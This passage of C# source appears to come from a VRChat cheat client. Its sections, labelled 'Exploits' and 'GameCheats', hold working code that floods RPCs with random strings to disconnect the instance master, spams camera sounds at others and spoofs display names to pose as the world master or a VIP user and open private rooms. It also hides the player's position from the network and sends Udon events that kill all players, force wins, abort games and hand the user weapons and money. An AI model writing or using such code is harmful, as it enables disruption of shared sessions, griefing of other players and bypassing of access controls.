                foreach (var action in udonevents)
                {
                    foreach (var subaction in action._eventTable)
                    {
                        if (subaction.key.StartsWith("transmirroron"))
                        {
                            action.SendCustomNetworkEvent(NetworkEventTarget.All, subaction.Key);
                        }
                    }
                }
                yield return new WaitForSecondsRealtime(0.5f);
                foreach (var action in udonevents)
                {
                    foreach (var subaction in action._eventTable)
                    {
                        if (subaction.key.StartsWith("HQbuttonoff"))
                        {
                            action.SendCustomNetworkEvent(NetworkEventTarget.All, subaction.Key);
                        }
                    }
                }
                yield return new WaitForSecondsRealtime(0.5f);
            }
            yield break;
        }

        #endregion

        #region FreeCam

        internal static Vector3 oPos;
        internal static Quaternion oRot;
        internal static FlatBufferNetworkSerializer serializer;

        public static void FreeCam(bool state)
        {
            if (state)
            {
                oPos = PlayerUtils.GetCurrentUser().transform.position;
                oRot = PlayerUtils.GetCurrentUser().transform.rotation;
                SerializationClone = UnityEngine.Object.Instantiate(PlayerUtils.GetCurrentUser().prop_VRCAvatarManager_0.prop_GameObject_0, null, true);
                Animator component = SerializationClone.GetComponent<Animator>();
                if (component != null && component.isHuman)
                {
                    Transform boneTransform = component.GetBoneTransform(HumanBodyBones.Head);
                    if (boneTransform != null) boneTransform.localScale = Vector3.one;
                }
                SerializationClone.name = "Serialize Clone";
                component.enabled = false;
                SerializationClone.GetComponent<FullBodyBipedIK>().enabled = false;
                SerializationClone.GetComponent<LimbIK>().enabled = false;
                SerializationClone.GetComponent<VRIK>().enabled = false;
                SerializationClone.GetComponent<LookTargetController>().enabled = false;
                SerializationClone.transform.position = oPos;
                SerializationClone.transform.rotation = oRot;
            }
            else
            {
                PlayerUtils.GetCurrentUser().transform.position = oPos;
                PlayerUtils.GetCurrentUser().transform.rotation = oRot;
            }
            if (serializer == null)
            {
                serializer = PlayerUtils.GetCurrentUser().GetComponent<FlatBufferNetworkSerializer>();
            }
            serializer.enabled = !state;
            if (state)
            {
                Flight.FlyOn();
                PlayerUtils.GetCurrentUser().prop_VRCAvatarManager_0.gameObject.SetActive(false);
            }
            else
            {
                Flight.FlyOff();
                PlayerUtils.GetCurrentUser().prop_VRCAvatarManager_0.gameObject.SetActive(true);
                UnityEngine.Object.Destroy(SerializationClone);
            }
        }

        #endregion

        #region Master Dc

        internal static bool MasterDC;
        public static VRC_EventHandler handler;
        public static IEnumerator DisconnectMaster()
        {
            handler = Resources.FindObjectsOfTypeAll<VRC_EventHandler>()[0];
            while (MasterDC)
            {
                yield return new WaitForSeconds(0.9f);
                for (int I = 0; I < 13; I++)
                {
                    MiscUtils.SendRPC(VRC_EventHandler.VrcEventType.SendRPC, "SendRPC", handler.gameObject, 1, 0, MiscUtils.RandomString(500), VRC_EventHandler.VrcBooleanOp.Unused, VRC_EventHandler.VrcBroadcastType.Always);
                }
            }
            yield break;
        }

        #endregion

        #region CamAnnoy

        public static bool IsFlashing = false;
        public static IEnumerator CameraAnn(Player P)
        {
            GameObject gameObject;
            while (IsFlashing)
            {
                yield return new WaitForSecondsRealtime(1);
                for (int i = 0; i < 5; i++)
                {
                    Networking.RPC(RPC.Destination.All, PlayerUtils.GetCurrentUser().transform.Find("UserCameraIndicator/Indicator").gameObject, "TimerBloop", new Il2CppSystem.Object[] { });
                }
            }
            yield break;
        }

        #endregion

        #region Force World Master

        internal static bool FWM;

        internal static IEnumerator ForceWorldMaster()
        {
            while (FWM)
            {
                if (VRCPlayer.field_Internal_Static_VRCPlayer_0 == null)
                {
                    FWM = false;
                }
                PlayerUtils.GetCurrentUser().GetComponent<VRC.Player>().field_Private_APIUser_0.displayName = $"{WorldUtils.GetInstanceMaster().GetDisplayName()}";
                yield return new WaitForSecondsRealtime(4);
            }
            yield break;
        }

        #endregion

        #endregion Exploits

        //----------------------------------------------------------------------------------------------------------------------------

        #region GameCheats

        #region Prison Escape

        public static void StartGamePE()
        {
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool flag2 = gameObject.name.Contains("Game Manager");
                if (flag2)
                {
                    gameObject.GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "StartGameCountdown");
                }
            }
        }

        public static void TestPE()
        {
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool flag2 = gameObject.name.Contains("Scorecard");
                if (flag2)
                {
                    gameObject.GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "_AddPoints");
                }
            }
        }

        public static void GetKeyCardsPE()
        {
            List<GameObject> list = new List<GameObject>();
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool Shotgun = gameObject.name.Contains("Keycard Dropped");
                if (Shotgun)
                {
                    list.Add(gameObject);
                }
            }
            foreach (GameObject gameObject2 in list)
            {
                bool IfShotgunHasPickUp = gameObject2.GetComponent<VRCPickup>();
                if (IfShotgunHasPickUp)
                {
                    Networking.SetOwner(VRCPlayer.field_Internal_Static_VRCPlayer_0.field_Private_VRCPlayerApi_0, gameObject2);
                    gameObject2.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                }
            }
        }

        public static void GetShotgunPE()
        {
            List<GameObject> list = new List<GameObject>();
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool Shotgun = gameObject.name.Contains("Shotgun");
                if (Shotgun)
                {
                    list.Add(gameObject);
                }
            }
            foreach (GameObject gameObject2 in list)
            {
                bool IfShotgunHasPickUp = gameObject2.GetComponent<VRCPickup>();
                if (IfShotgunHasPickUp)
                {
                    Networking.SetOwner(VRCPlayer.field_Internal_Static_VRCPlayer_0.field_Private_VRCPlayerApi_0, gameObject2);
                    gameObject2.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                }
            }
        }

        public static void GetRevolverPE()
        {
            List<GameObject> list = new List<GameObject>();
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool Revolver = gameObject.name.Contains("Revolver");
                if (Revolver)
                {
                    list.Add(gameObject);
                }
            }
            foreach (GameObject gameObject2 in list)
            {
                bool IfShotgunHasPickUp = gameObject2.GetComponent<VRCPickup>();
                if (IfShotgunHasPickUp)
                {
                    Networking.SetOwner(VRCPlayer.field_Internal_Static_VRCPlayer_0.field_Private_VRCPlayerApi_0, gameObject2);
                    gameObject2.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                }
            }
        }

        public static void GetSniperPE()
        {
            List<GameObject> list = new List<GameObject>();
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool Sniper = gameObject.name.Contains("Sniper");
                if (Sniper)
                {
                    list.Add(gameObject);
                }
            }
            foreach (GameObject gameObject2 in list)
            {
                bool IfShotgunHasPickUp = gameObject2.GetComponent<VRCPickup>();
                if (IfShotgunHasPickUp)
                {
                    Networking.SetOwner(VRCPlayer.field_Internal_Static_VRCPlayer_0.field_Private_VRCPlayerApi_0, gameObject2);
                    gameObject2.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                }
            }
        }

        public static void GetSMGPE()
        {
            List<GameObject> list = new List<GameObject>();
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool SMG = gameObject.name.Contains("SMG");
                if (SMG)
                {
                    list.Add(gameObject);
                }
            }
            foreach (GameObject gameObject2 in list)
            {
                bool IfShotgunHasPickUp = gameObject2.GetComponent<VRCPickup>();
                if (IfShotgunHasPickUp)
                {
                    Networking.SetOwner(VRCPlayer.field_Internal_Static_VRCPlayer_0.field_Private_VRCPlayerApi_0, gameObject2);
                    gameObject2.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                }
            }
        }

        public static void GetAssaultRiflePE()
        {
            List<GameObject> list = new List<GameObject>();
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool AssaultRifle = gameObject.name.Contains("Assault Rifle");
                if (AssaultRifle)
                {
                    list.Add(gameObject);
                }
            }
            foreach (GameObject gameObject2 in list)
            {
                bool IfShotgunHasPickUp = gameObject2.GetComponent<VRCPickup>();
                if (IfShotgunHasPickUp)
                {
                    Networking.SetOwner(VRCPlayer.field_Internal_Static_VRCPlayer_0.field_Private_VRCPlayerApi_0, gameObject2);
                    gameObject2.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                }
            }
        }

        public static void GetKnifePE()
        {
            List<GameObject> list = new List<GameObject>();
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool Knife = gameObject.name.Contains("Knife");
                if (Knife)
                {
                    list.Add(gameObject);
                }
            }
            foreach (GameObject gameObject2 in list)
            {
                bool IfShotgunHasPickUp = gameObject2.GetComponent<VRCPickup>();
                if (IfShotgunHasPickUp)
                {
                    Networking.SetOwner(VRCPlayer.field_Internal_Static_VRCPlayer_0.field_Private_VRCPlayerApi_0, gameObject2);
                    gameObject2.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                }
            }
        }

        public static void GetSmokeGrenadePE()
        {
            List<GameObject> list = new List<GameObject>();
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool SmokeGrenade = gameObject.name.Contains("Smoke Grenade");
                if (SmokeGrenade)
                {
                    list.Add(gameObject);
                }
            }
            foreach (GameObject gameObject2 in list)
            {
                bool IfShotgunHasPickUp = gameObject2.GetComponent<VRCPickup>();
                if (IfShotgunHasPickUp)
                {
                    Networking.SetOwner(VRCPlayer.field_Internal_Static_VRCPlayer_0.field_Private_VRCPlayerApi_0, gameObject2);
                    gameObject2.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                }
            }
        }

        public static void GetRPGPE()
        {
            List<GameObject> list = new List<GameObject>();
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool RPG = gameObject.name.Contains("RPG");
                if (RPG)
                {
                    list.Add(gameObject);
                }
            }
            foreach (GameObject gameObject2 in list)
            {
                bool IfShotgunHasPickUp = gameObject2.GetComponent<VRCPickup>();
                if (IfShotgunHasPickUp)
                {
                    Networking.SetOwner(VRCPlayer.field_Internal_Static_VRCPlayer_0.field_Private_VRCPlayerApi_0, gameObject2);
                    gameObject2.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                }
            }
        }

        public static void GetGrenadePE()
        {
            List<GameObject> list = new List<GameObject>();
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool Grenade = gameObject.name.Contains("Grenade");
                if (Grenade)
                {
                    list.Add(gameObject);
                }
            }
            foreach (GameObject gameObject2 in list)
            {
                bool IfShotgunHasPickUp = gameObject2.GetComponent<VRCPickup>();
                if (IfShotgunHasPickUp)
                {
                    Networking.SetOwner(VRCPlayer.field_Internal_Static_VRCPlayer_0.field_Private_VRCPlayerApi_0, gameObject2);
                    gameObject2.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                }
            }
        }

        public static void GetMachetePE()
        {
            List<GameObject> list = new List<GameObject>();
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool Machete = gameObject.name.Contains("Machete");
                if (Machete)
                {
                    list.Add(gameObject);
                }
            }
            foreach (GameObject gameObject2 in list)
            {
                bool IfShotgunHasPickUp = gameObject2.GetComponent<VRCPickup>();
                if (IfShotgunHasPickUp)
                {
                    Networking.SetOwner(VRCPlayer.field_Internal_Static_VRCPlayer_0.field_Private_VRCPlayerApi_0, gameObject2);
                    gameObject2.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                }
            }
        }

        public static void GetP90PE()
        {
            List<GameObject> list = new List<GameObject>();
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool P90 = gameObject.name.Contains("P90");
                if (P90)
                {
                    list.Add(gameObject);
                }
            }
            foreach (GameObject gameObject2 in list)
            {
                bool IfShotgunHasPickUp = gameObject2.GetComponent<VRCPickup>();
                if (IfShotgunHasPickUp)
                {
                    Networking.SetOwner(VRCPlayer.field_Internal_Static_VRCPlayer_0.field_Private_VRCPlayerApi_0, gameObject2);
                    gameObject2.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                }
            }
        }

        public static void GetM4A1PE()
        {
            List<GameObject> list = new List<GameObject>();
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool M4A1 = gameObject.name.Contains("M4A1");
                if (M4A1)
                {
                    list.Add(gameObject);
                }
            }
            foreach (GameObject gameObject2 in list)
            {
                bool IfShotgunHasPickUp = gameObject2.GetComponent<VRCPickup>();
                if (IfShotgunHasPickUp)
                {
                    Networking.SetOwner(VRCPlayer.field_Internal_Static_VRCPlayer_0.field_Private_VRCPlayerApi_0, gameObject2);
                    gameObject2.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                }
            }
        }

        public static void GrabAllMoneyPE()
        {
            try
            {
                GameObject.Find("Items/Money/Money Pile (7)").gameObject.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                GameObject.Find("Items/Money/Money Pile 3 (3)").gameObject.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                GameObject.Find("Items/Money/Money Pile (6)").gameObject.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                GameObject.Find("Items/Money/Money Pile 2 (5)").gameObject.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                GameObject.Find("Items/Money/Money Pile 2 (4)").gameObject.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                GameObject.Find("Items/Money/Money Pile 3 (2)").gameObject.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                GameObject.Find("Items/Money/Money Pile 2 (3)").gameObject.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                GameObject.Find("Items/Money/Money Pile (5)").gameObject.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                GameObject.Find("Items/Money/Money Pile 3 (1)").gameObject.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                GameObject.Find("Items/Money/Money Pile 3").gameObject.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                GameObject.Find("Items/Money/Money Pile 2 (2)").gameObject.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                GameObject.Find("Items/Money/Money Pile 2 (1)").gameObject.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                GameObject.Find("Items/Money/Money Pile 2").gameObject.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                GameObject.Find("Items/Money/Money Pile (4)").gameObject.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                GameObject.Find("Items/Money/Money Pile (3))").gameObject.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                GameObject.Find("Items/Money/Money Pile (2)").gameObject.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                GameObject.Find("Items/Money/Money Pile (1)").gameObject.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                GameObject.Find("Items/Money/Money Pile").gameObject.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                GameObject.Find("Items/Money/Money Pile (7)").gameObject.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                GameObject.Find("Items/Money/Money Pile (7)").gameObject.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
            }
            catch { }
        }

        public static void GrabAllModdedMoneyPE()
        {
            try
            {
                GameObject.Find("Items/Money/Test Money").gameObject.SetActive(true);
                GameObject.Find("Items/Money/Test Money/Money Pile 3 (4)").gameObject.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                GameObject.Find("Items/Money/Test Money/Money Pile 3 (5)").gameObject.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                GameObject.Find("Items/Money/Test Money/Money Pile 3 (6)").gameObject.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                GameObject.Find("Items/Money/Test Money/Money Pile 3 (7)").gameObject.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                GameObject.Find("Items/Money/Test Money/Money Pile 3 (32)").gameObject.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                GameObject.Find("Items/Money/Test Money/Money Pile 3 (33)").gameObject.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                GameObject.Find("Items/Money/Test Money/Money Pile 3 (34)").gameObject.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                GameObject.Find("Items/Money/Test Money/Money Pile 3 (35)").gameObject.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                GameObject.Find("Items/Money/Test Money/Money Pile 3 (36))").gameObject.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
            }
            catch { }
        }

        public static void KillPlayersPE()
        {
            GameObject.Find("PlayerData (23)").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
            GameObject.Find("PlayerData (33)").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
            GameObject.Find("PlayerData (16)").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
            GameObject.Find("PlayerData (20)").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
            GameObject.Find("PlayerData (27)").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
            GameObject.Find("PlayerData (29)").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
            GameObject.Find("PlayerData (5)").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
            GameObject.Find("PlayerData (9)").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
            GameObject.Find("PlayerData (19)").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
            GameObject.Find("PlayerData (10)").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
            GameObject.Find("PlayerData (11)").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
            GameObject.Find("PlayerData (15)").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
            GameObject.Find("PlayerData (25)").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
            GameObject.Find("PlayerData (21)").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
            GameObject.Find("PlayerData (4)").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
            GameObject.Find("PlayerData (22)").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
            GameObject.Find("PlayerData (13)").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
            GameObject.Find("PlayerData (2)").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
            GameObject.Find("PlayerData (30)").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
            GameObject.Find("PlayerData (28)").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
            GameObject.Find("PlayerData (31)").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
            GameObject.Find("PlayerData (7)").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
            GameObject.Find("PlayerData (8)").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
            GameObject.Find("PlayerData (12)").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
            GameObject.Find("PlayerData (17)").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
            GameObject.Find("PlayerData (32)").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
            GameObject.Find("PlayerData (14)").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
            GameObject.Find("PlayerData (1)").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
            GameObject.Find("PlayerData (3)").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
            GameObject.Find("PlayerData (26)").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
            GameObject.Find("PlayerData (24)").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
            GameObject.Find("PlayerData (6)").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
            GameObject.Find("PlayerData (18)").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
            GameObject.Find("PlayerData").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Damage200");
        }

        public static void DrinkEnergyDrinkPE()
        {
            GameObject.Find("Energy Drink").GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Use");
        }

        #endregion

        #region STD

        public static void StartRound()
        {
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool flag2 = gameObject.name.Contains("WaveController");
                if (flag2)
                {
                    gameObject.GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "AskForNewWave");
                }
            }
        }

        public static void ResetGame()
        {
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool flag2 = gameObject.name.Contains("WaveController");
                if (flag2)
                {
                    gameObject.GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "ResetGame");
                }
            }
        }

        #endregion

        #region Ghost

        public static void GetGhostName()
        {
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool flag2 = gameObject.name.Contains("GameManager");
                if (flag2)
                {
                    gameObject.GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "GetGhostName");
                }
            }
        }

        public static void ForceGhost()
        {
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool flag2 = gameObject.name.Contains("GameManager");
                if (flag2)
                {
                    gameObject.GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Net_IsGhost");
                }
            }
        }

        public static void TriggerWraithMode()
        {
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool flag2 = gameObject.name.Contains("GameManager");
                if (flag2)
                {
                    gameObject.GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "TriggerWraithMode");
                }
            }
        }

        public static void ForceDamage()
        {
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool flag2 = gameObject.name.Contains("GameManager");
                if (flag2)
                {
                    gameObject.GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Net_DamageHit");
                }
            }
        }

        #endregion

        #region AmongUs

        public static void ForceKillAllPlayers()
        {
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool flag2 = gameObject.name.Contains("Game Logic");
                if (flag2)
                {
                    gameObject.GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "KillLocalPlayer");
                }
            }
        }

        public static void CrewForceWin()
        {
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool flag2 = gameObject.name.Contains("Game Logic");
                if (flag2)
                {
                    gameObject.GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "SyncVictoryB");
                }
            }
        }

        public static void ImposterForceWin()
        {
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool flag2 = gameObject.name.Contains("Game Logic");
                if (flag2)
                {
                    gameObject.GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "SyncVictoryM");
                }
            }
        }

        public static void ForceAbortGame()
        {
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool flag2 = gameObject.name.Contains("Game Logic");
                if (flag2)
                {
                    gameObject.GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "SyncAbort");
                }
            }
        }

        public static void ForceStartGame()
        {
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool flag2 = gameObject.name.Contains("Game Logic");
                if (flag2)
                {
                    gameObject.GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "_start");
                    gameObject.GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "SyncStart");
                    gameObject.GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "SyncStartGame");
                }
            }
        }

        public static void Emergencymeeting()
        {
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool flag2 = gameObject.name.Contains("Game Logic");
                if (flag2)
                {
                    gameObject.GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "StartMeeting");
                }
            }
        }

        public static void ForceSkipVote()
        {
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool flag2 = gameObject.name.Contains("Game Logic");
                if (flag2)
                {
                    gameObject.GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Btn_SkipVoting");
                }
            }
        }

        public static void ForceBodywasfound()
        {
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool flag2 = gameObject.name.Contains("Game Logic");
                if (flag2)
                {
                    gameObject.GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "OnBodyWasFound");
                }
            }
        }

        public static void ForceCloseVote()
        {
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool flag2 = gameObject.name.Contains("Game Logic");
                if (flag2)
                {
                    gameObject.GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "SyncCloseVoting");
                }
            }
        }

        public static void ForceCompleteAllTasks()
        {
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool flag2 = gameObject.name.Contains("Game Logic");
                if (flag2)
                {
                    gameObject.GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "OnLocalPlayerCompletedTask");
                }
            }
        }

        #endregion

        #region ClubB

        internal static bool EliteBool;

        internal static IEnumerator BecomeElite()
        {
            while (EliteBool)
            {
                try
                {
                    if (VRCPlayer.field_Internal_Static_VRCPlayer_0 == null)
                    {
                        EliteBool = false;
                    }
                    PlayerUtils.GetCurrentUser().GetComponent<VRC.Player>().field_Private_APIUser_0.displayName = "Blue-kun";
                    if (!GameObject.Find("Lobby/Udon/MyI Control Panel").active && !GameObject.Find("Lobby/New Part/Udon/Spawn Settings/Buttons/Own Flair - BlueButtonWide").active)
                    {
                        GameObject.Find("Lobby/Udon/MyI Control Panel").SetActive(true);
                        GameObject.Find("Lobby/New Part/Udon/Spawn Settings/Buttons/Own Flair - BlueButtonWide").SetActive(true);
                        GameObject.Find("Penthouse/Private Rooms Exterior/Room Entrances/Private Room Entrance VIP/Teleport Out Position VIP").gameObject.active = false;
                    }
                }
                catch { }
                yield return new WaitForSecondsRealtime(3f);
            }
            yield break;
        }

        public static void TpToRoom7()
        {
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool flag2 = gameObject.name.Contains("Bedroom VIP");
                if (flag2)
                {
                    gameObject.SetActive(true);
                }
            }
            Vector3 position;
            position = new Vector3(57.2546f, 62.8588f, 0.0727f);
            PlayerUtils.GetCurrentUser().transform.position = position;
        }

        public static void TpToRoom6()
        {
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool flag2 = gameObject.name.Contains("Bedroom 6");
                if (flag2)
                {
                    gameObject.SetActive(true);
                }
            }
            Vector3 position;
            position = new Vector3(-11.3f, 55.7f, -90.5f);
            PlayerUtils.GetCurrentUser().transform.position = position;
        }

        public static void TpToRoom5()
        {
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
